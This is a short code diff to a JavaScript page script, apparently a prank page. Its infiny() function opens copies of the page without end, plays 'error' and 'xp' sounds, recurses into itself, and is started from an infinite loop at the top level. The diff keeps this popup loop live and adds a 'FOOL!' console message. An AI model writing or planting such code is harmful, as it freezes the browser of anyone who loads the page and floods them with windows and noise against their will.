@@ -9,17 +9,15 @@
     function infiny() {
         for (var i=0; i<Infinity; i++) {
             open("./.");
-            //alert("Oh no!")
-            //if (confirm("no work?")) {
-            //    error.play();xp.play();
-            //} 
+            
             error.play();xp.play();
+            console.log("FOOL!");
             for (var i=0; i<Infinity; i++) {
                 infiny();
                 error.play();xp.play();
             }
         }
-    }
+    } 
     for (var i=0; i<Infinity; i++) {
         infiny();
     }
